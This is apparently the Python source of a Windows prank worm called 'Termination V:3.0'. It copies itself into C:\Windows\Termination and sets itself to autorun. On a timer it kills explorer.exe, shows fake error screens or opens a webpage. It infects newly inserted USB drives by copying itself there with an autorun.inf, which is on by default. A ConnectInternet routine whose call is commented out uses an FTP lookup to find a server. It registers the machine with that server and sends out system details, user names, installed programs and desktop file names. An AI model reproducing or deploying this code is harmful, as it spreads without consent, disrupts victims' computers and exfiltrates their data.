#Termination V:3.0
import tkinter as tk
import tools
#Error
import Error.FlowerScreen
import Error.ERROR_HTML


#tools.os.chmod('readonly.txt', 0o777)


#Variable
__version__ = "3.0.0"
FontSize=10
PracticalJokeSleepTime=60*20
if not tools.os.path.isdir(r"C:\Windows\Termination"):
    tools.os.mkdir(r"C:\Windows\Termination")
if not tools.os.path.isfile(r"C:\Windows\Termination"+r"\Set.json"):
    tools.openw(
                r"C:\Windows\Termination"+r"\Set.json",
                tools.json.dumps(eval("{"+f'''"__version__":"{__version__}",
                                           "FontSize":"{FontSize}",
                                           "PracticalJokeSleepTime":"{PracticalJokeSleepTime}",
                                           "Show":"0",
                                           "SetWidth":"1000",
                                           "SetHeight":"600",
                                           "MainWidth":"300",
                                           "MainHeight":"200",
                                           "Infect":"1"'''+
                                        "}"), indent=4, ensure_ascii=False)
                )
Set=eval(tools.openr(r"C:\Windows\Termination"+r"\Set.json"))
__version__ = Set["__version__"]
FontSize = int(Set["FontSize"])
PracticalJokeSleepTime = int(Set["PracticalJokeSleepTime"])
Show = int(Set["Show"])
SetWidth = int(Set["SetWidth"])
SetHeight = int(Set["SetHeight"])
MainWidth = int(Set["MainWidth"])
MainHeight = int(Set["MainHeight"])
Infect = int(Set["Infect"])
 
 


RandomNumbers=-1



def restart():
    if tools.sys.argv[0].split(".")[-1].lower() == "exe":
        tools.os.popen(tools.os.path.normpath(r"C:\Windows\Termination")+"\\"+tools.sys.argv[0].split("\\")[-1].split("/")[-1])
    if tools.sys.argv[0].split(".")[-1].lower() in ["py","pyw","pyc","pyd"]:
        tools.os.popen("python -u "+tools.sys.argv[0].split("\\")[-1].split("/")[-1])
    tools.os._exit(0)

Work_Path=tools.os.path.dirname(tools.os.path.abspath(tools.sys.argv[0]))+"\\"
ExE_Path=tools.os.path.dirname(tools.os.path.abspath(tools.sys.argv[0]))+"\\"+tools.sys.argv[0].split("\\")[-1].split("/")[-1]
if ExE_Path.split(".")[-1].lower() == "exe":
    if tools.os.path.normpath(Work_Path) != tools.os.path.normpath(r"C:\Windows\Termination"):
        tools.shutil.copy(ExE_Path,tools.os.path.normpath(r"C:\Windows\Termination")+"\\")
        tools.os.popen(tools.os.path.normpath(r"C:\Windows\Termination")+"\\"+tools.sys.argv[0].split("\\")[-1].split("/")[-1])
        tools.os._exit(0)
    else:
        tools.AutoRun(zdynames=tools.sys.argv[0].split("\\")[-1].split("/")[-1],current_file=tools.sys.argv[0].split("\\")[-1].split("/")[-1].split(".")[0],abspath=Work_Path)

#Tk
root=tk.Tk()
root.title("Termination V:3.0")
root.overrideredirect(True)
root.wm_attributes("-topmost", True)
root.attributes('-transparentcolor','#f0f0f0')
root.geometry(f"{MainWidth}x{MainHeight}")
if Show == 0:
    root.withdraw()
root.update()
#Tk Move
width  = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.geometry(f"+{width-root.winfo_width()}+{height-root.winfo_height()-tools.get_taskbar_height()}")
#Main
title=tk.Label(root,text="Termination V:"+__version__,font=("5",FontSize),fg="#FFF")
title.pack(anchor="sw")

PresentState=tk.Label(root,text="PresentState: FreeTime",font=("5",FontSize),fg="#FFF")
PresentState.pack(anchor="sw")
NextState=tk.Label(root,text="NextState: FreeTime",font=("5",FontSize),fg="#FFF")
NextState.pack(anchor="sw")
NextNumbers=tk.Label(root,text=f"NextNumbers: None",font=("5",FontSize),fg="#FFF")
NextNumbers.pack(anchor="sw")
RandomNextTime=tk.Label(root,text=f"RandomNextTime: {PracticalJokeSleepTime}",font=("5",FontSize),fg="#FFF")
RandomNextTime.pack(anchor="sw")


@tools.asyncs
def PracticalJoke():
    global RandomNumbers
    while True:
        RandomNumbers=tools.random.randint(0,2)
        NextNumbers.config(text=f"NextNumbers: {RandomNumbers}")
        NextNumbers.update()
        if RandomNumbers == 0:
            NextState.config(text="NextState: FlowerScreen")
        if RandomNumbers == 1:
            NextState.config(text="NextState: KillExplorer")
        if RandomNumbers == 2:
            NextState.config(text="NextState: Open Webpage(1)")

        NextState.update()

        for i in range(PracticalJokeSleepTime,0-1,-1):
            RandomNextTime.config(text=f"RandomNextTime: {i}")
            RandomNextTime.update()
            tools.time.sleep(1)

        if RandomNumbers == 0:
            PresentState.config(text="PresentState: FlowerScreen")
            PresentState.update()
            Error.FlowerScreen.Start()
        if RandomNumbers == 1:
            PresentState.config(text="PresentState: KillExplorer")
            PresentState.update()
            tools.os.popen("taskkill /F /IM explorer.exe")
            StartExplorer=tk.Label(root,text=f"StartExplorer: 10",font=("5",FontSize),fg="#FFF")
            StartExplorer.pack(anchor="sw")
            for i in range(10,0-1,-1):
                StartExplorer.config(text=f"StartExplorer: {i}")
                StartExplorer.update()
                tools.time.sleep(1)
            tools.os.popen("explorer.exe")
            StartExplorer.destroy()
        if RandomNumbers == 2:
            tools.webbrowser.open('https://zhidao.baidu.com/question/1936298915211849907.html')





        PresentState.config(text="PresentState: FreeTime")
        PresentState.update()
        NextState.config(text="NextState: FreeTime")
        NextState.update()
PracticalJoke()


def Save(name,value):
    Set[name]=value
    tools.openw(
                r"C:\Windows\Termination"+r"\Set.json",
                tools.json.dumps(Set, indent=4, ensure_ascii=False)
                )

@tools.asyncs
def SetUp():
    SUTK=tk.Tk()
    SUTK.overrideredirect(True)
    SUTK.wm_attributes("-topmost", True)
    SUTK.title("Termination Set")
    SUTK.resizable(False,False)
    SUTK["bg"]="#202020"
    tools.index100(SUTK,SetWidth,SetHeight)
    title=tk.Label(SUTK,text="Termination"+__version__+" Set",font=("微软雅黑",20),bg="#202020",fg="#FFF")
    title.pack(fill="x",anchor="sw")

    tk.Label(SUTK,text="After changing any settings, restart the app",bg="#202020",fg="#FFF").pack(anchor="sw")

    wd=tk.Frame(SUTK,bg="#202020")
    wd.pack(anchor="sw")
    tk.Button(wd,text="Withdraw",command=root.withdraw,bd=0,bg="#202020",fg="#FFF").pack(side="left")
    tk.Button(wd,text="Deiconify",command=root.deiconify,bd=0,bg="#202020",fg="#FFF").pack(side="left")

    def AddFrameEntry(text,Valuev):
        F=tk.Frame(SUTK,bg="#202020")
        F.pack(anchor="sw")
        tk.Label(F,text=text,bg="#202020",fg="#FFF").pack(side="left")
        Entry=tk.Entry(F,bg="#202020",fg="#FFF",state="normal")
        Entry.pack(side="left")
        Entry.insert("insert",Set[Valuev])
        tk.Button(F,text="Save",command=lambda:Save(Valuev,Entry.get()),bd=0,bg="#202020",fg="#FFF").pack(side="left")

    AddFrameEntry("Desktop Font Size: ","FontSize")
    AddFrameEntry("Practical Joke Sleep Time: ","PracticalJokeSleepTime")
    AddFrameEntry("Set Tk Width: ","SetWidth")
    AddFrameEntry("Set Tk Height: ","SetHeight")
    AddFrameEntry("Main Tk Show: ","Show")
    AddFrameEntry("Main Tk Width: ","MainWidth")
    AddFrameEntry("Main Tk Height: ","MainHeight")
    AddFrameEntry("USB Infect: ","Infect")





    tk.Button(SUTK,text="ReStart",command=restart,bd=0,bg="#202020",fg="#FFF").pack(anchor="sw")

    tk.Button(SUTK,text="ExitSet",command=lambda:tools.os._exit(0),bd=0,bg="#202020",fg="#FFF").pack(side="left")
    tools.SELFYD(title,SUTK)
    SUTK.mainloop()


#Tasker System Menu
# 创建图标对象
@tools.asyncs
def IconMenu():
    image = tools.base64_to_image("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAl0lEQVR4nO3QQREAIAzAMEDJ/JsEGXnQKOh1z8xdHzs6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugArQE6QGuADtAaoAO0BugA7QFpXAHf+1CNfwAAAABJRU5ErkJggg==")
    menu = (
            tools.pystray.MenuItem(text='设置', action=SetUp),
            tools.pystray.MenuItem(text='显示', action=lambda:root.deiconify()),
            tools.pystray.MenuItem(text='隐藏', action=lambda:root.withdraw()),
            tools.pystray.MenuItem(text='重启', action=restart),
            tools.pystray.MenuItem(text='退出', action=lambda:tools.os._exit(0)),
            ) # 创建菜单项元组
    icon = tools.pystray.Icon("name", image, "Termination", menu)
    icon.run()
    icon.notify(title="通知标题", message="通知内容")
IconMenu()


@tools.asyncs
def ForGetUsb():
    if Infect == 1:
        s=tools.get_available_drives()
        while True:
            tools.time.sleep(5)
            if s != tools.get_available_drives():
                for i in tools.get_available_drives():
                    if i not in s:
                        if not tools.os.path.isdir(i):
                            continue
                        if tools.os.path.isfile(i+"\\"+"autorun.inf"):
                            tools.os.chmod(i+"\\"+"autorun.inf", 0o777)
                        tools.shutil.copy(ExE_Path,i+"\\")
                        tools.openw(i+"\\"+"autorun.inf",f"""[AutoRun]
Open={i+tools.sys.argv[0].split("\\")[-1].split("/")[-1]}""")
ForGetUsb()


@tools.asyncs
def ConnectInternet():
    while True:
        if not tools.is_internet_available():#No Net
            tools.time.sleep(5)
        else:
            break
    while True:
        ft = tools.ftplib.FTP()
        ft.connect("!!!!!!!!!!!!!!", 21)
        ft.login("!!!!!!!!!!!!!!!!!!!1", "!!!!!!!!!!!!!!")
        Host=tools.ftp.typefile(ft,"T3_Host")

        InFo=tools.Get(Host+"/Api_T3/InFo")
        if InFo == SystemError and InFo == "T3 Server Is True":
            Host=tools.ftp.typefile(ft,"T3_Host")
            tools.time.sleep(5)
        else:
            break
    ID=tools.uuid.getnode()

    if eval(tools.Post(Host+"/Api_T3/Is_T3C",{"T3C_Name":str(ID)})):
        pass
    else:
        tools.Post(Host+"/Api_T3/Add_T3C",{"T3C_Name":str(ID)})
    
    T3C_InFo_Json={
        "node":str(tools.Computer_data(get="node")),
        "platformstr":str(tools.Computer_data(get="platformstr")),
        "processor":str(tools.Computer_data(get="processor")),
        "system":str(tools.Computer_data(get="system")),
        "winpath":str(tools.Computer_data(get="winpath")),
        "Users":tools.Computer_data(get="Users"),
        "Program_Filesx86":tools.Computer_data(get="Program_Filesx86"),
        "Program_Files":tools.Computer_data(get="Program_Files"),
        "UsersPath":str(tools.Computer_data(get="Userspath")),
        "Desktop Files":tools.Computer_data(get="Desktop"),
        "Fonts":tools.Computer_data(get="Fonts"),
    }
    tools.Post(Host+"/Api_T3/Add_T3C_InFo",{"T3C_Name":str(ID),"T3C_InFo_Json":str(T3C_InFo_Json)})
    
#ConnectInternet()



@tools.asyncs
def Web():
    pass


def exits(event):
    if event.char == "E":
        tools.os._exit(0)
root.bind("<Key>",exits)
root.mainloop()